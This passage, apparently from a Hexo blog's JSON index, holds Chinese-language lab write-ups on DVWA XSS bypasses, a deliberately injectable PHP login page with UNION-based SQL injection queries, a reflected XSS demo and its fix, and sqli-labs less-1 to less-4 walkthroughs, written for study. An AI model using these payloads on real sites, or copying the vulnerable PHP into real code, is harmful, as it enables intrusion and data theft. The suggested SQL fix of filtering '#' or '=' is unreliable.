YQ9x4P.png](https://s1.ax1x.com/2020/05/09/YQ9x4P.png) 源代码对message，name输入框内容 没有进行XSS方面的过滤和检查，可以用burpsuite抓包 修改mtxmessage或者name值为 &lt;script&gt;alert(document.cookie)&lt;/script&gt; Mid: 使用 &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;或者&lt;sCript&gt;alert(document.cookie)&lt;/script&gt; 即可绕过过滤，过程与low相同 High： 修改为 &lt;IMG src=1 onerror=alert(document.cookie)&gt; 即可绕过过滤，过程与low相同","categories":[],"tags":[{"name":"sql,xss","slug":"sql-xss","permalink":"http://yoursite.com/tags/sql-xss/"}]},{"title":"自建简单网页攻击","slug":"wangan","date":"2020-05-09T03:04:39.000Z","updated":"2020-05-09T04:48:07.287Z","comments":true,"path":"2020/05/09/wangan/","link":"","permalink":"http://yoursite.com/2020/05/09/wangan/","excerpt":"","text":"自建网页攻击\\4. 复现SQLi和XSS漏洞，获取数据库的表名，数据库名以及列名，数据内容等信息及漏洞修复 1) 下载wampserver并在其上的www目录下新建 login.php 和 test.php Login**：** &lt;html&gt; &lt;head&gt; &lt;title&gt;网络安全作业二&lt;/title&gt; &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; &lt;/head&gt; &lt;body &gt; &lt;form action=&quot;test.php&quot; method=&quot;post&quot;&gt; &lt;fieldset &gt; &lt;legend&gt;自建sql注入平台&lt;/legend&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;用户名：&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;密 码：&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;password&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt; &lt;td&gt;&lt;input type=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/fieldset&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; Test： &lt;?php $pwd=$_POST[&#39;password&#39;]; $uname=$_POST[&#39;username&#39;]; //echo &quot;您当前执行的sql语句为：&quot; ; //echo &quot;select * from admin where password=&#39;$pwd&#39; and name=&#39;$uname&#39;&lt;br/&gt;&quot;; //echo &quot;&lt;hr&gt;&quot;; $mysqli = new mysqli(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;&#39;,&#39;sqlin&#39;); if(mysqli_connect_errno()){ printf(&quot;连接失败:%s&lt;br&gt;&quot;,mysqli_connect_error()); exit(); } $result = $mysqli-&gt;query(&quot;select * from admin where name=&#39;$uname&#39;&quot;); //print_r($result-&gt;fetch_array(MYSQLI_ASSOC)); if($row=mysqli_fetch_row($result)) { printf (&quot;%s : %s&quot;,$row[0],$row[1]); echo &quot;&lt;br&gt;&quot;; echo &quot;success！&quot;; } else { echo &quot;账号或密码错误！&quot;; } $mysqli-&gt;close(); $result-&gt;close();?&gt; 2) 创建数据库sqlin并写入数据 3) Sql**注入** 通过输入用户名 1&#39; order by 3#或1&#39; order by 2# 判断sql有几列 1&#39; union select 1,database() # 获取数据库名 1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 获取数据表名 0&#39; union select (select column_name from information_schema.columns where table_name=&#39;admin&#39; limit 0,1),(select column_name from information_schema.columns where table_name=&#39;admin&#39; limit 1,2)# 获取列名 YMxXWD.png 1&#39; union select * from admin# 获取数据 4) 修复 在test.php中可以加入对于“#”或者“=”的过滤，并对长度进行限制 例如 if(strlen($pwd)&gt;10) echo &quot;账号或密码错误！&quot;; 5) XSS**漏洞利用** www目录下新建xss.php xss**：** &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;XSS&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;input&quot;&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;br&gt; &lt;?php $XssReflex = $_GET[&#39;input&#39;]; echo &#39;output:&lt;br&gt;&#39;.$XssReflex; ?&gt; &lt;/body&gt; &lt;/html&gt; 6) XSS**漏洞攻击** 如果输入2则输出2，但是如果输入可执行代码 &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 此时查看源代码则发现我们输入的内容，弹窗弹出说明我们的代码是可执行的。 7) XSS**漏洞防范** 我们可以用htmlentities() 函数把字符转换为 HTML 实体 例：将 echo &#39;output:&lt;br&gt;&#39;.$XssReflex; 替换成 echo &#39;output:&lt;br&gt;&#39;.htmlentities($XssReflex); 再去输入上一步的代码。 发现没有弹窗，说明漏洞被修复，类似的还有htmlspecialchars函数HTMLPurifier.auto.php插件，RemoveXss函数等可以防范反射型xss漏洞的利用。","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"http://yoursite.com/tags/sql/"},{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]},{"title":"sqllab","slug":"sqllib","date":"2020-04-14T07:09:58.000Z","updated":"2020-04-25T13:02:02.610Z","comments":true,"path":"2020/04/14/sqllib/","link":"","permalink":"http://yoursite.com/2020/04/14/sqllib/","excerpt":"","text":"less-1先输入?id=1判断是否存在注入漏洞 JygZrt.png 在输入?id=1’发现构造出了’1’’的错误语句 JygJrq.png 输入1’or 1=1—+发现回显正常，由于空格会被自动去掉，所以用+代替空格 JygYq0.png order by 3成功，order by 4 失败，判断有3列数据 Jygys1.png JygBRJ.png 输入-1’union select 1,2,3—+,当查询不存在的id时，数据库会将后面的查询语句的内容回显，并且可以判断2，3为显示位 输入database()获取数据库名，输入version（）获取版本号 Jyg2dK.png JygRIO.png 通过group_concat将多个数据查询结果转为字符串输出，通过查询information获取库名，并查询security库中的表名 JygfiD.png JyghJe.png 查询users表中的列 Jyg4RH.png 获取用户名及密码 JygoQA.png less-2输入1发现正常返回，1’错误返回，’’LIMIT 0,1’说明为数字型注入 Jyg5zd.png JygTsI.png 只需将less-1中的’去掉就可以通过 Jyg7Lt.png less-3输入1’发现回显’1’’)多了一个)，猜测将查询为id=（’$id’） JygbeP.png 将-1’后加个）即可通过 Jygqdf.png less-4输入1’正常返回。输入1”错误 JygLo8.png JygXFS.png 猜测将id进行了（””)包装，构住1”)即可通过 JygjJg.png","categories":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/categories/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sql","slug":"sql","permalink":"http://yoursite.com/tags/sql/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-04-13T14:34:12.659Z","updated":"2020-04-13T14:34:12.659Z","comments":true,"path":"2020/04/13/hello-world/","link":"","permalink":"http://yoursite.com/2020/04/13/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new &quot;My New Post&quot; More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"靶场","slug":"靶场","permalink":"http://yoursite.com/categories/%E9%9D%B6%E5%9C%BA/"},{"name":"逆向","slug":"逆向","permalink":"http://yoursite.com/categories/%E9%80%86%E5%90%91/"},{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/categories/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://yoursite.com/tags/%E7%BC%96%E7%A8%8B/"},{"name":"逆向","slug":"逆向","permalink":"http://yoursite.com/tags/%E9%80%86%E5%90%91/"},{"name":"sql,xss","slug":"sql-xss","permalink":"http://yoursite.com/tags/sql-xss/"},{"name":"sql","slug":"sql","permalink":"http://yoursite.com/tags/sql/"},{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]}